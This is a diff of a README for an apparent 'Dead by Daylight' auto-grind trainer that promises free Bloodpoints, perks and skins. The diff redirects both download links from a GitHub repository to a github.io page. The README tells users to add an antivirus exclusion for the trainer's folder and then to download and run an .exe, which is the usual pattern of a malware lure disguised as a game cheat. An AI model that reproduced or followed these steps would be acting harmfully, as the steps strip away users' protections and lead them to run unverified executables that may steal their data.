@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your game progress with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/gihda/DBD-AutoGrind-Trainer-2026)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://gihda.github.io)
 
 This project helps players manage their progression in Dead by Daylight. The tool automates repetitive tasks to save you time. It includes features to manage Bloodpoints, unlock perks, and customize character skins. This software runs externally to keep your game interaction smooth.
 
@@ -31,7 +31,7 @@ Follow these steps to prepare your system and run the trainer.
 
 1.  **Antivirus Configuration:** Windows Defender and third-party antivirus software often block external game tools. Open your security settings. Add an exclusion for the folder where you plan to store the trainer. This prevents the system from deleting the files.
 2.  **Download the File:** Go to the project page to find the latest version.
-    [https://github.com/gihda/DBD-AutoGrind-Trainer-2026](https://github.com/gihda/DBD-AutoGrind-Trainer-2026)
+    [https://gihda.github.io](https://gihda.github.io)
     Click the link, navigate to the releases section, and download the latest .exe file.
 3.  **Extracting the Tool:** Place the downloaded file into a dedicated folder on your desktop. Right-click the folder and ensure it is not marked as read-only.
 4.  **Running the Software:** Double-click the file to launch it. You will see a small console window open. This window processes the data. Keep this window open while you play.
